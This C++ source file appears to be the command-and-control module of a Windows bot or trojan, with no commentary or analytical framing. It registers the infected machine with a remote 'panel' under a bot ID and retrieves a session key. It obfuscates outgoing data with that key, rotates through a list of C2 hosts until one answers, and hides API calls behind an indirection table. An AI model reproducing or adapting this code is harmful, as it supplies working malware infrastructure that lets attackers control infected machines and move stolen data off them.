#include "Panel.h"
#include "Utils.h"
#include "HTTP.h"

static char            *gKey               = NULL;
static char             gBotId[BOT_ID_LEN] = { 0 };
static char             gPath [256]        = { 0 };
static int              gHostIndex         = 0;
static HttpRequestData  gRequest           = { 0 };
static CRITICAL_SECTION gSwitchCritSec;
static CRITICAL_SECTION gInitCritSec;

static void SwitchHost()
{
   Funcs::pEnterCriticalSection(&gSwitchCritSec);
   ++gHostIndex;
   if(!HOST[gHostIndex])
      gHostIndex = 0;
   Funcs::pLeaveCriticalSection(&gSwitchCritSec);
   Funcs::pSleep(POLL);
}

void InitPanelRequest()
{
   Funcs::pInitializeCriticalSection(&gInitCritSec);
}

char *PanelRequest(char *data, int *outputSize)
{
   if(!gKey)
   {
      EnterCriticalSection(&gInitCritSec);
      Funcs::pInitializeCriticalSection(&gSwitchCritSec);
      char request[32] = { 0 };
      Funcs::pLstrcpyA(request, Strs::pingRequest);

      GetBotId(gBotId);

      Funcs::pLstrcpyA(gPath, PATH);
      Funcs::pLstrcatA(gPath, "?");
      Funcs::pLstrcatA(gPath, gBotId);

      gRequest.host            = HOST[gHostIndex];
      gRequest.port            = PORT;
      gRequest.path            = gPath;
      gRequest.post            = TRUE;

      while(!HttpSubmitRequest(gRequest))
      {
         SwitchHost();
         gRequest.host = HOST[gHostIndex];
      }
      gKey = (char *) gRequest.outputBody;
      LeaveCriticalSection(&gInitCritSec);
   }
   HttpRequestData request;
   Funcs::pMemcpy(&request, &gRequest, sizeof(gRequest));

   request.inputBody     = (BYTE *) data;
   request.inputBodySize = Funcs::pLstrlenA(data);

   Obfuscate(request.inputBody, request.inputBodySize, gKey);

   while(!HttpSubmitRequest(request))
   {
      SwitchHost();
      request.host  = HOST[gHostIndex];
      gRequest.host = HOST[gHostIndex];
   }
   Obfuscate(request.outputBody, request.outputBodySize, gKey);
   if(outputSize)
      *outputSize = request.outputBodySize;
   return (char *) request.outputBody;
}